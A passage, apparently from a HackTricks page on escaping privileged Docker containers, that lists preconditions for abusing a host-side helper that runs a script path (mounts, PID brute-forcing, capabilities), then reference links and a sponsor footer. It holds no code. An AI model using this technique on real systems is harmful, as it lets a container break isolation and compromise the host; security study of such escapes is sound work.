* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
